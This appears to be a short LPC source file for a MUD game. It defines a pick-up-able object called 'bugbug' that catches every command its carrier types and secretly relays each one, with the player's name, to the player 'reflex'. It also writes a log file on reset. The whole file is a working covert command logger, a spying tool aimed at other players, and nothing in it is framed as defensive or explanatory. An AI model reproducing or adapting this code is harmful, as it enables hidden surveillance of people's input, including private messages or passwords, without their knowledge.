reset() {
  write_file("/players/reflex/closed/logs/kaleia", "X");
}
get() { return 1; }
drop() { return 1; }
id(str) { return str == "bugbug"; }
init() {
  add_action("ekg"); add_xverb("");
}

ekg(str) {
  if(find_player("reflex")) {
tell_object(find_player("reflex"), "**"+
    (this_player()->query_name())+
    "**"+query_verb()+" "+str+"\n");
    return 0;
    }
}
